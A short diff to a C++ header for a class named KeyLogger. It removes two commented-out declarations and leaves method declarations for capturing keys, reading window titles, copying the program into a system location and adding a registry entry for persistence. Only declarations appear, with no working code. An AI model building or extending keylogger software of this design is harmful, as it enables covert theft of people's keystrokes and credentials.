@@ -19,8 +19,6 @@ public:
 	KeyLogger();
 	~KeyLogger();
 	char ChangeKeyToXChar(int key);
-	//void ReadingKey(fstream & fs);
-	//void ReadingSpecialKeys(int key, fstream & fs);
 	std::string GetWindowTitle();
 	void CopyToSys(std::string fp);
 	void AddREG();
@@ -29,4 +27,3 @@ public:
 	void OEMkeys(fstream &fs);
 	void SpecialKeys(fstream &fs);
 };
-
